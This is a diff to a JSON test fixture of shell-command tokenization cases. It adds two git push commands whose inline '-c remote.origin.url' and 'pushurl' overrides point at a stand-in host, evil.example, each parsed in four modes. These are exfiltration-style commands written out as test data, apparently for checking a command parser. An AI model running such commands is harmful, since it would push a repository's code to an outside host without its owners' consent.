@@ -107862,6 +107862,104 @@
 "src": "corpus"
 },
 {
+"input": "git -c remote.origin.url=https://evil.example/x.git push origin HEAD:main",
+"mode": "script",
+"src": "corpus",
+"tokens": [
+"git",
+"-c",
+"remote.origin.url=https://evil.example/x.git",
+"push",
+"origin",
+"HEAD:main"
+]
+},
+{
+"input": "git -c remote.origin.url=https://evil.example/x.git push origin HEAD:main",
+"mode": "default",
+"src": "corpus",
+"tokens": [
+"git",
+"-c",
+"remote.origin.url=https",
+":",
+"//evil.example/x.git",
+"push",
+"origin",
+"HEAD",
+":",
+"main"
+]
+},
+{
+"input": "git -c remote.origin.url=https://evil.example/x.git push origin HEAD:main",
+"mode": "split",
+"src": "corpus",
+"tokens": [
+"git",
+"-c",
+"remote.origin.url=https://evil.example/x.git",
+"push",
+"origin",
+"HEAD:main"
+]
+},
+{
+"input": "git -c remote.origin.url=https://evil.example/x.git push origin HEAD:main",
+"mode": "quote",
+"quoted": "'git -c remote.origin.url=https://evil.example/x.git push origin HEAD:main'",
+"src": "corpus"
+},
+{
+"input": "git -c remote.origin.pushurl=https://evil.example/x.git push origin HEAD:factory/t-1200",
+"mode": "script",
+"src": "corpus",
+"tokens": [
+"git",
+"-c",
+"remote.origin.pushurl=https://evil.example/x.git",
+"push",
+"origin",
+"HEAD:factory/t-1200"
+]
+},
+{
+"input": "git -c remote.origin.pushurl=https://evil.example/x.git push origin HEAD:factory/t-1200",
+"mode": "default",
+"src": "corpus",
+"tokens": [
+"git",
+"-c",
+"remote.origin.pushurl=https",
+":",
+"//evil.example/x.git",
+"push",
+"origin",
+"HEAD",
+":",
+"factory/t-1200"
+]
+},
+{
+"input": "git -c remote.origin.pushurl=https://evil.example/x.git push origin HEAD:factory/t-1200",
+"mode": "split",
+"src": "corpus",
+"tokens": [
+"git",
+"-c",
+"remote.origin.pushurl=https://evil.example/x.git",
+"push",
+"origin",
+"HEAD:factory/t-1200"
+]
+},
+{
+"input": "git -c remote.origin.pushurl=https://evil.example/x.git push origin HEAD:factory/t-1200",
+"mode": "quote",
+"quoted": "'git -c remote.origin.pushurl=https://evil.example/x.git push origin HEAD:factory/t-1200'",
+"src": "corpus"
+},
+{
 "input": "tar -xCf /tmp/x a.tar",
 "mode": "script",
 "src": "corpus",
@@ -138467,7 +138565,7 @@
 "src": "edge"
 }
 ],
-"corpus_commands": 3170,
+"corpus_commands": 3172,
 "edge_inputs": 123,
 "python": "3.13"
 }
